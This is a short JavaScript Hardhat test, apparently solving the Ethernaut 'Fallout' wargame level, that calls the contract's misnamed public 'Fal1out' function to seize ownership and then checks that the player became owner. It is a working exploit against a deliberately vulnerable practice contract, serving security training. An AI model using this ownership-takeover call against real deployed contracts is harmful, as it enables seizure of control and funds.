const { expect } = require("chai");
const { ethers } = require("hardhat");
var tools = require("./tools");

describe("02Fallout", function () {
  let player, levelOwner, levelContract;
  it("setup", async function () {
    [player, levelOwner, levelContract] = await tools.initLevel("Fallout");
    //检查原始的owner
    expect(await levelContract.owner()).to.not.equal(player.address);
  });

  it("attacks", async function () {
    await levelContract.connect(player).Fal1out({
      value: ethers.utils.parseEther("0.0001").toNumber(),
    });
  });

  it("check", async function () {
    //检查通过条件
    expect(await levelContract.owner()).to.equal(player.address);
  });
});
